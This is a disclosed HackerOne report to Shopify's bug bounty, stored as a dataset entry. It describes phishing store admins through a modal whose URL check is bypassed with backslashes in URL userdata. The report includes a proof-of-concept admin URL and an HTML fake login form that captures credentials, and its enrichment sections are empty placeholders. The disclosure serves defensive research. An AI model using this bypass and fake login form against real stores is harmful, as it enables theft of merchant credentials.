---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '422279'
original_report_id: '422279'
title: H1514 Simple phishing using auto-created modal with weak URL-pattern check
  in incontext_app_link
weakness: Business Logic Errors
team_handle: shopify
created_at: '2018-10-11T00:37:43.811Z'
disclosed_at: '2019-04-10T22:35:47.817Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 22
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- business-logic-errors
---

# H1514 Simple phishing using auto-created modal with weak URL-pattern check in incontext_app_link

## Metadata

- HackerOne Report ID: 422279
- Weakness: Business Logic Errors
- Program: shopify
- Disclosed At: 2019-04-10T22:35:47.817Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

This is unrelated to the Twine-template issue reported earlier as this would still be an issue if the template escape would be fixed. 

### Background

The `incontext_app_link` is checked server-side if it's a correct `shopifycloud.com`-URL. The problem however is that userdata inside the URL is allowed. By utilizing two backslashes `\\` in the userdata, we're able to make all browsers except Safari load the URL before the `@` instead of the domain after. This means that since the `API.modal.open` triggers directly when the victim accesses the page, we can fake a login page on this URL to make the admin think they need to reauthorize in Shopify. However, the link is actually loaded from a different domain and the credentials will be stolen whenever the admins uses the form.

The same thing applies here as to the Twine-report, the attacker needs to use a product-ID that exists for the merchant. But since these IDs are publicly available in the webstore, this should be no issue.

### PoC

PoC-link (use your own store, and also replace `1557454323768` with a working Product ID inside your store):

```
/admin/products/1557454323768?incontext_app_link=https%3A%2F%2F████████%5C%5C%40google-shopping.shopifycloud.com
```

The following HTML is loaded from `██████`:


```html
<center>
<form onsubmit="alert('your login is: ' + document.getElementById('u').value + ':' + document.getElementById('p').value); return false">
<input id="u" placeholder="Email address" style=" position: absolute; top: 140px; left: 80px; font-size: 20px; height: 50px; border: 0; width: 400px;">
<input id="p" placeholder="Password" type="password" style="position: absolute; font-size: 20px; height: 50px; border: 0; width: 400px; left: 80px; top: 210px;">
<button type="submit" style="position: absolute; left: 80px; height: 50px; top: 280px; width: 480px; background: transparent; border: 0;"></button></form>
<img src="login.png" width="600" /></center>
<script>parent.postMessage('{"message":"Shopify.API.Modal.setHeight","data":{"height":500,"width":"940"}}','*')</script>
```

{F358706}

Here's a video showing the scenario of the attacker sending a link to an admin:

{F358705}

Regards,
Frans and Mathias

## Impact

#

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
